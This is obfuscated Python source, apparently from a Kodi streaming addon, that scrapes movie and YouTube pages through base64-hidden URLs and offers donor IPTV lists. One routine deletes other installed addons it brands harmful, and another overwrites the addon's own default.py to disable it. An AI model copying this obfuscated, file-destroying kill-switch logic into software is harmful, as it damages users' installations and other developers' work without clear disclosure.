   IiI1i = xbmcgui . Dialog ( ) . yesno ( 'Remove Potentially Harmful Addons' , 'Remove will remove addons known to alter genie tv' , 'Close will stop genie tv working to protect' , 'you from any potential unwanted updates' , nolabel = 'Close' , yeslabel = 'Remove' )
   if IiI1i == 0 :
    O0OOO0OOoO0O ( OO00Oo )
    o0Oo00 ( )
   elif IiI1i == 1 :
    iI ( OO00Oo )
  else :
   pass
   if 90 - 90: I1I1ii % oO0O - iIii1I11I1II1 - iIii1I11I1II1 / i11iIiiIii % ii11ii1ii
def iI ( addon ) :
 o0O = ( addon ) . replace ( 'special://home/addons/' , '' )
 Oo0oO0ooo . create ( "[COLOR=white]The addons are being removed as requested[/COLOR]" , 'Please enjoy Genie Tv and we thank you for your support' , '[COLORyellow]Hopefully this may end soon and peace is restored[/COLOR]' )
 xbmc . sleep ( 3000 )
 addon = xbmc . translatePath ( str ( addon ) )
 shutil . rmtree ( addon , ignore_errors = True )
 Oo0oO0ooo . update ( 100 , "" , "Your Device is now clean" )
 xbmc . sleep ( 1000 )
 Oo0oO0ooo . close ( )
 if 37 - 37: Ooo0OO0oOO - OOOo0 . OOoo0OO0 * oO0O - II1i1IiiIIi11
def O0OOO0OOoO0O ( addon ) :
 oOOoo00O0O . ok ( "[COLOR=white]Incompatible[/COLOR]" , "Unfortunately GenieTv will not work with" , addon , 'please remove then reinstall genie' )
 OO = os . path . join ( II , 'default.py' )
 OoOoO = open ( OO , "w+" )
 if 8 - 8: Ooo00oOo00o - OOOo0 % oO0O * OoooooooOO - Ooo00oOo00o * I1I1ii
 OoOoO . write ( r'Genie Tv will not work with certain addons in an attempt to bring you original content from the best developers' )
 OoOoO . write ( r'and not those simply out to profit or make a name for themselves off others work' )
 OoOoO . write ( r'Please remove' + unwanted_addons + 'if you would like to use genie tv then uninstall and reinstall from official repo' )
 if 6 - 6: OoooooooOO
 if 17 - 17: OOOo0 % I1I1ii
def o00oO0oo0OO ( ) :
 oO0 = i11iIIIIIi1 ( i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) )
 OOOoo = re . compile ( '<tr>.+?title="(.+?)">(.+?)</tr>' , re . DOTALL ) . findall ( oO0 )
 for O0oO , OOOoo in OOOoo :
  O0oO = O0oO
  OoOO0oo0o = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)\n</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( OOOoo ) )
  for OO0ooOOO0OOO , oO00oooOOoOo0 in OoOO0oo0o :
   ooO00OO0 ( O0oO , OO0ooOOO0OOO , oO00oooOOoOo0 )
   if 74 - 74: iIii1I11I1II1 * ii11ii1ii + I1IiI / i1IIi / OoOoOO00 . Oo
   if 62 - 62: OoooooooOO * OOOo0
   if 58 - 58: I1IiI % OOooOOo
   if 50 - 50: I1I1ii . OOooOOo
   if 97 - 97: O0 + I1IiI
   if 89 - 89: OOooOOo + Ooo00oOo00o * OOoo0OO0 * oO0O
   if 37 - 37: OoooooooOO - O0 - OOooOOo
   if 77 - 77: i11i1 * iIii1I11I1II1
   if 98 - 98: OOOo0 % oO0O * OoooooooOO
   if 51 - 51: iIii1I11I1II1 . I1IiI / Ooo0OO0oOO + OOooOOo
   if 33 - 33: oOO . OoOoOO00 % II1i1IiiIIi11 + OOooOOo
   if 71 - 71: Oo % i11i1
   if 98 - 98: OOoo0OO0 % i11iIiiIii % oOO + oO0O
   if 78 - 78: ii11ii1ii % Ooo0OO0oOO / II1i1IiiIIi11 - iIii1I11I1II1
   if 69 - 69: I1I1ii
   if 11 - 11: OOOo0
   if 16 - 16: oO0O + iI1Ii11iII1 * O0 % i1IIi . OOOo0
def Oo0OO ( ) :
 O00OOOoOoo0O ( 'Genre' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10073 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'Most Viewed' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9tb3ZpZXMv' ) , 10077 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'Box Office' , i1111 ( 'aHR0cDovL2ltb3ZpZW1heC5zZS9jYXRlZ29yeS9ib3gtb2ZmaWNlLw==' ) , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 O00OOOoOoo0O ( 'Search' , '' , 10078 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
 if 78 - 78: i11i1 - OoooooooOO - ii11ii1ii / oOO / OoOoOO00
def iiI11ii1I1 ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oOo0OOoO0 = 'http://imoviemax.se/?s=' + ( Ooo0OOoOoO0 ) . replace ( ' ' , '+' )
 IIo0Oo0oO0oOO00 = oOo0OOoO0 . lower ( )
 oo00OO0000oO ( IIo0Oo0oO0oOO00 )
def I1II1 ( url ) :
 oooO = [ ]
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<li class="cat-item cat-item-.+? "><a href="(.+?)">(.+?)</a><i>(.+?)</i></li>' ) . findall ( oO0 )
 for url , OO0ooOOO0OOO , i1I1i111Ii in OoOO0oo0o :
  if OO0ooOOO0OOO in oooO :
   pass
  else :
   O00OOOoOoo0O ( OO0ooOOO0OOO + ' - ' + i1I1i111Ii + ' Films' , url , 10074 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
   oooO . append ( OO0ooOOO0OOO )
   if 67 - 67: OOOo0 . i1IIi
def i1i1iI1iiiI ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<li>.+?<b>.+?</b>.+?<a href="(.+?)">(.+?)</a>.+?<span>(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
 for url , OO0ooOOO0OOO , Ooo0oOooo0 in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO + ' - Views:' + Ooo0oOooo0 , url , 10075 , ii11iIi1I + 'genievision.png' , i1iiIII111ii , '' )
  if 61 - 61: I1IiI - i11i1 - i1IIi
  if 25 - 25: O0 * OOoo0OO0 + ii11ii1ii . OOooOOo . OOooOOo
def oo00OO0000oO ( url ) :
 oOooO = [ ]
 oO0 = i11iIIIIIi1 ( url )
 next = re . compile ( "<link rel='next' href='(.+?)' />" ) . findall ( oO0 )
 for next in next :
  O00OOOoOoo0O ( 'NEXT PAGE' , next , 10074 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 OoOO0oo0o = re . compile ( '<div class="movie">.+?<img src="(.+?)" alt="(.+?)" />.+?<a href="(.+?)"><span class="player"></span></a>' , re . DOTALL ) . findall ( oO0 )
 for IIIIiI11I11 , OO0ooOOO0OOO , url in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 10075 , IIIIiI11I11 , IIIIiI11I11 , '' )
  oOooO . append ( OO0ooOOO0OOO )
  if 58 - 58: OOOo0
def Ii1iI111II1I1 ( img , name , url ) :
 img = img
 name = name
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div id="(.+?)" class="player-content"><iframe class="playerframe" src="(.+?)" scrolling="no".+?</iframe></div>' ) . findall ( oO0 )
 for oOOOOoOO0o , url in OoOO0oo0o :
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>> before' + url
  i1II1 = ( url ) . replace ( 'player' , 'watch' ) + '&fv=&sou='
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<< after' + i1II1
  i11i1IiiiiI1i1Iii = ( oOOOOoOO0o ) . replace ( 'play-' , 'Server ' )
  ooo00OOOooO ( i11i1IiiiiI1i1Iii , i1II1 , 10076 , img , img , '' )
  if 87 - 87: OOooOOo
def IiI1iiiIii ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<source src="(.+?)" type="video/mp4">' ) . findall ( oO0 )
 for I1III1111iIi in OoOO0oo0o :
  if '=m' in I1III1111iIi :
   I1i111I ( I1III1111iIi )
  elif 'php' in I1III1111iIi :
   IiI1iiiIii ( url )
  else :
   oO0 = i11iIIIIIi1 ( I1III1111iIi )
   OoOO0oo0o = re . compile ( 'content="(.+?)">' ) . findall ( oO0 )
   for OooOo0oo0O0o00O in OoOO0oo0o :
    I1i111I ( I1III1111iIi )
    if 48 - 48: oOO / I1I1ii . iIii1I11I1II1 * I1IiI * Ooo0OO0oOO / i1IIi
    if 92 - 92: Oo % Oo - OOooOOo / I1IiI
    if 10 - 10: II1i1IiiIIi11 + Oo * ii11ii1ii + iIii1I11I1II1 / I1I1ii / ii11ii1ii
def iI1II ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 o0OOo0o0O0O = re . compile ( '<td id=".+?" class="today">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( oO0 )
 for O0oO , o0OO0o0oOOO0O in o0OOo0o0O0O :
  print 'there ><><><><><><><><><><><><'
  O0oO = O0oO
  OoOO0oo0o = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( o0OO0o0oOOO0O ) )
  for OO0ooOOO0OOO , oO00oooOOoOo0 in OoOO0oo0o :
   print 'here <><><><><><><><><><><><>'
   O00OOOoOoo0O ( '[COLORred]' + O0oO + '[/COLOR] - ' + OO0ooOOO0OOO + ' - [COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
 OOOoo = re . compile ( '<td id=".+?" class="day">.+?title="(.+?)">(.+?)</td>' , re . DOTALL ) . findall ( oO0 )
 for O0oO , iII1i11 in OOOoo :
  print 'there ><><><><><><><><><><><><'
  O0oO = O0oO
  OoOO0oo0o = re . compile ( '<p><a href=".+?" rel=".+?">(.+?)</a>.+?<br /><a href=".+?">(.+?)</a>.+?</p>' , re . DOTALL ) . findall ( str ( iII1i11 ) )
  for OO0ooOOO0OOO , oO00oooOOoOo0 in OoOO0oo0o :
   print 'here <><><><><><><><><><><><>'
   O00OOOoOoo0O ( '[COLORred]' + O0oO + '[/COLOR] - ' + OO0ooOOO0OOO + ' - [COLORgreen]' + oO00oooOOoOo0 + '[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5wb2dkZXNpZ24uY28udWsvY2F0Lw==' ) , 10070 , ii11iIi1I + 'loader.png' , i1iiIII111ii , '' )
   if 81 - 81: O0 . OoooooooOO . II1i1IiiIIi11 - Oo / Ooo00oOo00o + ii11ii1ii
   if 100 - 100: II1i1IiiIIi11 % i11i1
   if 86 - 86: Oo . O0 - OoooooooOO . Ooo00oOo00o + oO0O
def OOo ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OOOoo = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( oO0 )
 for OOOoo in OOOoo :
  OO0ooOOO0OOO = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( OOOoo ) )
  for OO0ooOOO0OOO in OO0ooOOO0OOO :
   OO0ooOOO0OOO = ( OO0ooOOO0OOO ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
  url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( OOOoo ) )
  for url in url :
   url = 'https://www.youtube.com/w' + url
  IIii11Ii1i1I = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( OOOoo ) )
  for IIii11Ii1i1I in IIii11Ii1i1I :
   IIii11Ii1i1I = 'http:' + IIii11Ii1i1I
  ooo00OOOooO ( '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , '' , '' )
  if 76 - 76: O0 + i1IIi . Oo * OOOo0 * oO0O
  if 14 - 14: OOooOOo % O0 * II1i1IiiIIi11 + oO0O + Oo * oO0O
  if 3 - 3: I1IiI * Oo
  if 95 - 95: i11i1 % Ooo0OO0oOO . oO0O
def o0Oooo ( url ) :
 if 36 - 36: OoooooooOO . Ooo00oOo00o
 oOIIiIi = [ ]
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<div class="explore-list">.+?<div class="el-img"><a href="(.+?)" class=".+?"><img src="(.+?)" alt=".+?<h3>(.+?)</h3><p>(.+?)</p></div>' , re . DOTALL ) . findall ( oO0 )
 for I1III1111iIi , IIIIiI11I11 , OO0ooOOO0OOO , OOoOooOoOOOoo in OoOO0oo0o :
  OO0ooOOO0OOO = ( OO0ooOOO0OOO ) . replace ( '&#039;' , '\'' ) . replace ( '&' , '&' ) . replace ( '&quot;' , '"' )
  Iiii1iI1i = i11iIIIIIi1 ( I1III1111iIi )
  II11i1I11Ii1i = re . compile ( '<!-- # player # -->.+?<iframe title=".+?".+?src="http://www.youtube.com/embed/(.+?)?autohide.+?<!-- detail box -->(.+?)</div>' , re . DOTALL ) . findall ( Iiii1iI1i )
  for I1ii1ii11i1I , o0OoOO in II11i1I11Ii1i :
   O0O0Oo00 = re . compile ( '<p>(.+?)</p>' , re . DOTALL ) . findall ( str ( o0OoOO ) )
   for oOoO00o in O0O0Oo00 :
    if OO0ooOOO0OOO in oOIIiIi :
     pass
    else :
     ooo00OOOooO ( OO0ooOOO0OOO , I1ii1ii11i1I , 8043 , IIIIiI11I11 , IIIIiI11I11 , oOoO00o )
     Oo0oO ( 'movies' , 'INFO' )
     oOIIiIi . append ( OO0ooOOO0OOO )
     if 100 - 100: OOooOOo + i11i1 * OOooOOo
     if 80 - 80: OOooOOo * O0 - oO0O
def oo00O00Oo ( url ) :
 IIIII1II = iI1 ( url )
 OoOO0oo0o = re . compile ( '<a href="(.+?)" target="_blank"><img src="(.+?)" style="max-width:200px;" /><description = "(.+?)" /><background = "(.+?)" </background></a><br><b>(.+?)</b>' ) . findall ( IIIII1II )
 for url , IiI , oOoO00o , iI1ii1i , OO0ooOOO0OOO in OoOO0oo0o :
  O00OOOoOoo0O ( OO0ooOOO0OOO , url , 10065 , IiI , iI1ii1i , oOoO00o )
 Oo0oO ( 'movies' , 'INFO' )
 if 85 - 85: OoooooooOO % i1IIi * OoooooooOO / ii11ii1ii
def ooOOoO ( ) :
 Ooo0OOoOoO0 = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oOo0OOoO0 = 'https://www.youtube.com/results?search_query=' + ( Ooo0OOoOoO0 ) . replace ( ' ' , '+' )
 IIo0Oo0oO0oOO00 = oOo0OOoO0 . lower ( )
 oO0 = i11iIIIIIi1 ( IIo0Oo0oO0oOO00 )
 OoOO0oo0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( oO0 )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( oO0 )
 for I1i11i in next :
  I1i11i = 'https://www.youtube.com' + I1i11i
  O00OOOoOoo0O ( '[COLORgreen] NEXT [/COLOR]' , I1i11i , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for IIIIiI11I11 , I1i11i , OO0ooOOO0OOO , IiIi , o0OoOO in OoOO0oo0o :
  Ooo . append ( OO0ooOOO0OOO )
  Oo0oO ( 'tvshows' , 'INFO' )
  IIii11Ii1i1I = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + IIii11Ii1i1I
  I1i11i = 'http://www.youtube.com' + I1i11i
  ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( I1i11i ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , IIii11Ii1i1I , o0OoOO )
 else :
  OoOO0oo0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
  for IIIIiI11I11 , I1i11i , OO0ooOOO0OOO , IiIi in OoOO0oo0o :
   print 'im doing it'
   Oo0oO ( 'tvshows' , 'INFO' )
   IIii11Ii1i1I = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
   I1i11i = 'http://www.youtube.com' + I1i11i
   if '&' in I1i11i :
    print ' i got here'
    oO0 = i11iIIIIIi1 ( I1i11i )
    OOOoo = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( oO0 )
    for OOOoo in OOOoo :
     OO0ooOOO0OOO = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( OOOoo ) )
     for OO0ooOOO0OOO in OO0ooOOO0OOO :
      OO0ooOOO0OOO = ( OO0ooOOO0OOO ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
     I1i11i = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( OOOoo ) )
     for I1i11i in I1i11i :
      I1i11i = 'https://www.youtube.com/w' + I1i11i
     IIii11Ii1i1I = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( OOOoo ) )
     for IIii11Ii1i1I in IIii11Ii1i1I :
      IIii11Ii1i1I = 'http:' + IIii11Ii1i1I
     ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( I1i11i ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , i1iiIII111ii , '' )
   elif OO0ooOOO0OOO in Ooo :
    pass
   elif 'user' in I1i11i or 'elete' in OO0ooOOO0OOO :
    pass
   elif 'hannel' in I1i11i :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + I1i11i
    oO0 = i11iIIIIIi1 ( I1i11i )
    OOOOO0O00 = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( oO0 )
    for IIIIiI11I11 , I1i11i , OO0ooOOO0OOO in OOOOO0O00 :
     if 'outube' in I1i11i or 'list' in I1i11i :
      pass
     elif 'atch' in I1i11i :
      I1i11i = ( I1i11i ) . replace ( '/watch?v=' , '' )
      ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( I1i11i ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + IIIIiI11I11 , 'http:' + IIIIiI11I11 , '' )
     else :
      pass
   else :
    ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( I1i11i ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , IIii11Ii1i1I , '' )
    if 30 - 30: iIii1I11I1II1 . OOOo0 . i11i1 / OOooOOo
def iiI1I1 ( url ) :
 oO0 = i11iIIIIIi1 ( url )
 OoOO0oo0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>.+?<div class="yt-lockup-description yt-ui-ellipsis yt-ui-ellipsis-2" dir="ltr">(.+?)</div>' , re . DOTALL ) . findall ( oO0 )
 next = re . compile ( '<a href="(.+?)" class="yt-uix-button.+?class="yt-uix-button-content">Next.+?</span></a>' ) . findall ( oO0 )
 for url in next :
  url = 'https://www.youtube.com' + url
  O00OOOoOoo0O ( '[COLORgreen] NEXT [/COLOR]' , url , 10065 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 for IIIIiI11I11 , url , OO0ooOOO0OOO , IiIi , o0OoOO in OoOO0oo0o :
  Ooo . append ( OO0ooOOO0OOO )
  Oo0oO ( 'tvshows' , 'INFO' )
  IIii11Ii1i1I = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
  print '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>' + IIii11Ii1i1I
  url = 'http://www.youtube.com' + url
  ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , IIii11Ii1i1I , o0OoOO )
 else :
  OoOO0oo0o = re . compile ( '<img src="(.+?)" alt=.+?yt-lockup-title "><a href="(.+?)".+?data-sessionlink=.+?" title="(.+?)".+?<span class="accessible-description".+?>(.+?)</span>' , re . DOTALL ) . findall ( oO0 )
  for IIIIiI11I11 , url , OO0ooOOO0OOO , IiIi in OoOO0oo0o :
   Oo0oO ( 'tvshows' , 'INFO' )
   IIii11Ii1i1I = 'http:' + ( IIIIiI11I11 ) . replace ( 'https:' , '' )
   url = 'http://www.youtube.com' + url
   if '&' in url :
    oO0 = i11iIIIIIi1 ( url )
    OOOoo = re . compile ( '<li class="yt-uix-scroller-scroll-unit "(.+?)</li>' , re . DOTALL ) . findall ( oO0 )
    for OOOoo in OOOoo :
     OO0ooOOO0OOO = re . compile ( 'data-video-title="(.+?)"' ) . findall ( str ( OOOoo ) )
     for OO0ooOOO0OOO in OO0ooOOO0OOO :
      OO0ooOOO0OOO = ( OO0ooOOO0OOO ) . replace ( '&quot;' , '' ) . replace ( '&#39;' , '\'' ) . replace ( '&' , '&' )
     url = re . compile ( '<a href="/w(.+?)&' ) . findall ( str ( OOOoo ) )
     for url in url :
      url = 'https://www.youtube.com/w' + url
     IIii11Ii1i1I = re . compile ( '<img.+?="(.+?)"' ) . findall ( str ( OOOoo ) )
     for IIii11Ii1i1I in IIii11Ii1i1I :
      IIii11Ii1i1I = 'http:' + IIii11Ii1i1I
     ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , i1iiIII111ii , '' )
   elif OO0ooOOO0OOO in Ooo :
    pass
   elif 'user' in url or 'elete' in OO0ooOOO0OOO :
    pass
   elif 'hannel' in url :
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~' + url
    oO0 = i11iIIIIIi1 ( url )
    OOOOO0O00 = re . compile ( 'data-thumb="(.+?)".+?href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( oO0 )
    for IIIIiI11I11 , url , OO0ooOOO0OOO in OOOOO0O00 :
     if 'outube' in url or 'list' in url :
      pass
     elif 'atch' in url :
      url = ( url ) . replace ( '/watch?v=' , '' )
      ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , 'http:' + IIIIiI11I11 , 'http:' + IIIIiI11I11 , '' )
     else :
      pass
   else :
    ooo00OOOooO ( '[COLORred]' + IiIi + '[/COLOR]' + '[COLORgreen]' + OO0ooOOO0OOO + '[/COLOR]' , ( url ) . replace ( 'https://www.youtube.com/watch?v=' , '' ) . replace ( 'http://www.youtube.com/watch?v=' , '' ) , 8043 , IIii11Ii1i1I , IIii11Ii1i1I , '' )
    if 56 - 56: OOOo0 . O0 + Oo
    if 1 - 1: II1i1IiiIIi11
def O0O0Ooo ( ) :
 if oo0o0O00 == 'insert_password' :
  oOOoo00O0O . ok ( '[COLORgreen]Donators Login[/COLOR]' , 'You need to set username and password to access this' , 'These are unique and provided to donators to help with server and stream costs' , 'Donate @ [COLORgreen]http://architects.x10host.com[/COLOR]' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
 else :
  oOoO0 = open ( I11II1i )
  OoOO0oo0o = re . compile ( 'plugin.video.GenieTv.+?2Flive%2F(.+?)%2F(.+?)%2F' ) . findall ( str ( oOoO0 ) )
  for Oo0 , oo0O0o00o0O in OoOO0oo0o :
   if Oo0 == 'needs replacing' or oo0O0o00o0O == 'needs replacing' :
    I11i1II ( )
  O00OOOoOoo0O ( '[COLORgreen]DONATORS LIST[/COLOR]' , iiI1IiI + '/thelistnew.m3u' , 7080 , ii11iIi1I + 'GTVIPTV.png' , i1iiIII111ii , '' )
  if 72 - 72: iIii1I11I1II1 . i1IIi / Oo . OoOoOO00
def ooo000o000 ( ) :
 i1iiIIiiI111 . ok ( '[COLOR=white]ReCreate Addons.ini[/COLOR]' , 'If it doesnt work ensure login details are correct and retry' , '' , 'This will allow access to streams in guide without linking to favourites' )
 xbmc . executebuiltin ( "XBMC.RunScript(" + O0o0Oo + ")" )
 I11i1II ( )
 i1iiIIiiI111 . ok ( '[COLOR=yellow]Done[/COLOR]' , 'Done' , 'Easy as that' , 'Now Go to guide and it should link your GTV streams' )
 if 100 - 100: iI1Ii11iII1 . OOoo0OO0 / oO0O % I1IiI % OoOoOO00 - Ooo00oOo00o
def IiIi1I1ii111 ( ) :
 try :
  IiIiIi = gui . TVGuide ( )
  IiIiIi . doModal ( )
  del IiIiIi
  if 27 - 27: ii11ii1ii + I1IiI - i11i1 + O0 . oO0O
 except :
  import sys
  import traceback as tb
  ( iIi1i1iIi1iI , iiIi1iI1iIii , traceback ) = sys . exc_info ( )
  tb . print_exception ( iIi1i1iIi1iI , iiIi1iI1iIii , traceback )
  if 68 - 68: i11i1
def OooO0oo ( ) :
 O00OOOoOoo0O ( 'Full Backup' , '' , 10061 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your Full System' )
 if os . path . exists ( OOOO ) :
  O00OOOoOoo0O ( 'Backup Genie Favourites' , I1i11i , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites' )
 if os . path . exists ( I1IIIii ) :
  O00OOOoOoo0O ( 'Backup Ivue Config' , I1IIIii , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your master.db' )
 if os . path . exists ( oOoOooOo0o0 ) :
  O00OOOoOoo0O ( 'Backup Kodi Favourites' , oOoOooOo0o0 , 10062 , ii11iIi1I + 'Backup.png' , i1iiIII111ii , 'Back Up Your favourites.xml' )
  if 89 - 89: oO0O
  if 76 - 76: oOO
  if 15 - 15: i11i1 . OOoo0OO0 + OoooooooOO - Ooo00oOo00o
zip = o0oO0 . getSetting ( 'zip' )
Oo0oooooOOO000Oo = xbmc . translatePath ( os . path . join ( zip ) )
def Ooo00OoOOO ( ) :
 Oo0OO0000oooo = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if not os . path . exists ( zip ) :
  i1iiIIiiI111 . ok ( '[COLOR=white]Origin[/COLOR]' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' , '' , '' )
  o0oO0 . openSettings ( sys . argv [ 0 ] )
  if 7 - 7: Ooo0OO0oOO - Ooo00oOo00o - O0 % Ooo0OO0oOO - OoOoOO00
  if 31 - 31: II1i1IiiIIi11 / Oo - II1i1IiiIIi11 - i11i1
  if 7 - 7: II1i1IiiIIi11 % O0 . I1IiI + OOOo0 - OOoo0OO0
def o0o0O00oo0 ( name , url , description ) :
 if 'Backup' in name :
  if 'Genie' in name :
   url = OOOO
  elif 'Ivue' in name :
   url = I1IIIii
  elif 'Kodi' in name :
   url = oOoOooOo0o0
  Ooo00OoOOO ( )
  Ii1ii1IiIII = open ( url ) . read ( )
  ooO0o = os . path . join ( Oo0oooooOOO000Oo , description . split ( 'Your ' ) [ 1 ] )
  ooOOo00O00Oo = open ( ooO0o , mode = 'w' )
  ooOOo00O00Oo . write ( Ii1ii1IiIII )
  ooOOo00O00Oo . close ( )
 else :
  if 'guisettings.xml' in description :
   IiII1 = open ( os . path . join ( Oo0oooooOOO000Oo , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   I1iIi1iIiiIiI = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % skin
   OoOO0oo0o = re . compile ( I1iIi1iIiiIiI ) . findall ( IiII1 )
   for type , I1i11ii , i111iI in OoOO0oo0o :
    i111iI = i111iI . replace ( '&quot;' , '' ) . replace ( '&' , '&' )
    xbmc . executebuiltin ( "Skin.Se	t%s(%s,%s)" % ( type . title ( ) , I1i11ii , i111iI ) )
  else :
   ooO0o = os . path . join ( url )
   Ii1ii1IiIII = open ( os . path . join ( Oo0oooooOOO000Oo , description . split ( 'Your ' ) [ 1 ] ) ) . read ( )
   ooOOo00O00Oo = open ( ooO0o , mode = 'w' )
   ooOOo00O00Oo . write ( Ii1ii1IiIII )
   ooOOo00O00Oo . close ( )
